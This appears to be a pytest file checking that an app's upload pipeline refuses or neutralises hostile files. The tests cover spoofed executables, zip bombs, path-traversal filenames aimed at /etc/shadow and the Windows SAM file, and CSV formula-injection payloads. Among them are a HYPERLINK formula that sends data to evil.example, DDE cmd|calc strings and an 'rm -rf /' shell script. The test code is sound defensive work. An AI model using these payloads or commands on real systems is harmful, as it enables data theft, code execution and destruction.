"""File ingestion treated as hostile input.

Each test supplies a file an attacker would actually send: a polyglot, a
mislabelled executable, a traversal filename, a spreadsheet formula, a
decompression bomb. The pipeline must refuse or neutralise every one *before*
a parser is involved.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.backend.ingestion.safety import (
    MAX_EXPANSION_RATIO,
    MAX_FILE_BYTES,
    UnsafeFileError,
    check_expansion,
    csv_row,
    detect_type,
    neutralize_formula,
    resolve_within,
    sanitize_filename,
    validate_upload,
)

MINIMAL_PDF = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<</Root 1 0 R>>\n%%EOF\n"


# --- type detection ---------------------------------------------------------


def test_type_comes_from_content_not_from_the_extension():
    assert detect_type(MINIMAL_PDF, filename="policy.pdf") == "pdf"


def test_an_executable_renamed_to_pdf_is_refused():
    """MIME and extension spoofing: the bytes are what decide."""
    with pytest.raises(UnsafeFileError, match="Windows executable"):
        detect_type(b"MZ\x90\x00" + b"\x00" * 200, filename="invoice.pdf")


def test_an_elf_binary_is_refused():
    with pytest.raises(UnsafeFileError, match="Linux executable"):
        detect_type(b"\x7fELF\x02\x01\x01" + b"\x00" * 200, filename="doc.pdf")


def test_a_shell_script_is_refused():
    with pytest.raises(UnsafeFileError, match="shebang"):
        detect_type(b"#!/bin/sh\nrm -rf /\n", filename="notes.txt")


def test_html_is_refused_so_it_cannot_be_served_back():
    with pytest.raises(UnsafeFileError, match="HTML"):
        detect_type(b"<html><script>alert(1)</script></html>", filename="report.txt")


def test_a_bare_zip_archive_is_refused():
    """A zip bomb's outer layer never gets unpacked."""
    with pytest.raises(UnsafeFileError, match="ZIP archive"):
        detect_type(b"PK\x03\x04" + b"\x00" * 500, filename="bundle.zip")


def test_a_polyglot_whose_name_disagrees_with_its_bytes_is_refused():
    """A PDF header on a file called `.csv` is a deliberate mislabel."""
    with pytest.raises(UnsafeFileError, match="do not|must agree|contents are"):
        detect_type(MINIMAL_PDF, filename="data.csv")


def test_an_empty_file_is_refused():
    with pytest.raises(UnsafeFileError, match="empty"):
        detect_type(b"", filename="empty.pdf")


def test_binary_masquerading_as_text_is_refused():
    with pytest.raises(UnsafeFileError, match="binary"):
        detect_type(b"col1,col2\n\x00\x01\x02binary", filename="data.csv")


def test_plain_text_and_csv_are_recognised():
    assert detect_type(b"a,b,c\n1,2,3\n", filename="rows.csv") == "csv"
    assert detect_type(b"just some prose here\n", filename="notes.txt") == "text"


# --- declared content type --------------------------------------------------


def test_a_lying_content_type_header_is_refused():
    with pytest.raises(UnsafeFileError, match="does not match"):
        validate_upload(
            MINIMAL_PDF, filename="a.pdf", declared_content_type="text/html"
        )


def test_a_truthful_content_type_is_accepted():
    result = validate_upload(
        MINIMAL_PDF, filename="a.pdf", declared_content_type="application/pdf"
    )
    assert result.detected_type == "pdf"


# --- size limits ------------------------------------------------------------


def test_an_oversized_file_is_refused_before_parsing():
    oversized = MINIMAL_PDF + b"\x00" * (MAX_FILE_BYTES + 1)
    with pytest.raises(UnsafeFileError, match="limit"):
        validate_upload(oversized, filename="huge.pdf")


def test_a_custom_lower_limit_is_honoured():
    with pytest.raises(UnsafeFileError, match="limit"):
        validate_upload(MINIMAL_PDF, filename="a.pdf", max_bytes=10)


# --- decompression bombs ----------------------------------------------------


def test_an_extreme_expansion_ratio_is_refused():
    """The zip/decompression bomb signature: tiny file, enormous text."""
    with pytest.raises(UnsafeFileError, match="decompression bomb"):
        check_expansion(
            source_bytes=1_000,
            extracted_chars=1_000 * (MAX_EXPANSION_RATIO + 10),
            label="bomb.pdf",
        )


def test_an_absolute_extraction_ceiling_also_applies():
    """A large file expanding modestly still cannot produce unbounded text."""
    with pytest.raises(UnsafeFileError, match="above the"):
        check_expansion(
            source_bytes=10_000_000_000, extracted_chars=50_000_000, label="big.pdf"
        )


def test_an_ordinary_document_passes_the_expansion_check():
    check_expansion(source_bytes=100_000, extracted_chars=40_000, label="normal.pdf")


# --- filenames --------------------------------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "....//....//secret.pdf",
        "%2e%2e%2fpasswd",
        "file\x00.pdf",
        "a/b/c/../../../../root.pdf",
    ],
)
def test_traversal_filenames_are_defused(hostile):
    safe = sanitize_filename(hostile)
    assert "/" not in safe
    assert "\\" not in safe
    assert ".." not in safe
    assert "\x00" not in safe


def test_a_windows_reserved_name_is_renamed():
    assert sanitize_filename("CON.pdf") != "CON.pdf"
    assert sanitize_filename("nul.txt").startswith("file_")


def test_a_filename_that_reduces_to_nothing_gets_a_fallback():
    assert sanitize_filename("../") == "document"
    assert sanitize_filename("") == "document"
    assert sanitize_filename("...") == "document"


def test_an_overlong_filename_is_truncated():
    assert len(sanitize_filename("a" * 5000 + ".pdf")) <= 200


def test_an_ordinary_filename_survives_intact():
    assert sanitize_filename("Support_Policy_v3.pdf") == "Support_Policy_v3.pdf"


def test_a_path_cannot_escape_its_storage_directory(tmp_path):
    base = tmp_path / "uploads"
    base.mkdir()
    for hostile in ("../../etc/passwd", "..\\..\\secret", "/etc/shadow"):
        resolved = resolve_within(base, hostile)
        assert base in resolved.parents or resolved.parent == base


def test_resolve_within_keeps_a_normal_name(tmp_path):
    base = tmp_path / "uploads"
    base.mkdir()
    assert resolve_within(base, "policy.pdf") == (base / "policy.pdf").resolve()


# --- spreadsheet formula injection ------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil.example/?d="&A1,"click")',
        "=cmd|'/c calc'!A0",
        "+1+1",
        "-2+3+cmd|' /c calc'!A0",
        "@SUM(1+1)*cmd|'/c calc'!A0",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_formula_payloads_are_neutralised(payload):
    """CSV injection: a cell that a spreadsheet would execute on open."""
    neutralised = neutralize_formula(payload)
    assert neutralised.startswith("'")
    assert neutralised[1:] == payload


def test_ordinary_values_are_left_alone():
    for value in ("ACCT-001", "1500.00", "Northstar Logistics", "a=b"):
        assert neutralize_formula(value) == value


def test_a_whole_row_is_neutralised():
    row = csv_row(["=1+1", "safe", None, 42])
    assert row[0] == "'=1+1"
    assert row[1] == "safe"
    assert row[2] == ""
    assert row[3] == "42"


# --- the real ingestion path ------------------------------------------------


def test_the_pdf_parser_is_never_handed_a_non_pdf(tmp_path):
    from app.backend.retrieval.extraction import DocumentIngestionError, extract_document

    path = tmp_path / "evil.pdf"
    path.write_bytes(b"MZ\x90\x00" + b"\x00" * 500)
    with pytest.raises(DocumentIngestionError):
        extract_document(path)


def test_an_empty_pdf_is_refused(tmp_path):
    from app.backend.retrieval.extraction import DocumentIngestionError, extract_document

    path = tmp_path / "empty.pdf"
    path.write_bytes(b"")
    with pytest.raises(DocumentIngestionError, match="empty"):
        extract_document(path)


def test_an_oversized_pdf_is_refused_without_parsing(tmp_path, monkeypatch):
    from app.backend.retrieval import extraction

    monkeypatch.setattr(extraction, "MAX_FILE_BYTES", 100)
    path = tmp_path / "big.pdf"
    path.write_bytes(MINIMAL_PDF + b"\x00" * 500)

    with pytest.raises(extraction.DocumentIngestionError, match="exceeds"):
        extraction.extract_document(path)


def test_a_password_protected_pdf_is_refused(tmp_path):
    """An encrypted document cannot be read, and must fail as such."""
    pymupdf = pytest.importorskip("pymupdf")

    document = pymupdf.open()
    document.new_page().insert_text((72, 72), "secret contents")
    path = tmp_path / "locked.pdf"
    document.save(str(path), encryption=pymupdf.PDF_ENCRYPT_AES_256, user_pw="hunter2")
    document.close()

    from app.backend.retrieval.extraction import DocumentIngestionError, extract_document

    with pytest.raises(DocumentIngestionError, match="password-protected"):
        extract_document(path)


def test_the_real_source_pack_still_ingests(tmp_path):
    """The hardening must not reject the documents the product runs on."""
    from app.backend.retrieval.extraction import extract_document

    source_dir = Path(__file__).resolve().parent.parent / "data" / "source"
    pdfs = sorted(source_dir.glob("*.pdf"))
    assert pdfs, "the source pack is missing"
    for pdf in pdfs:
        extracted = extract_document(pdf)
        assert extracted.document.title
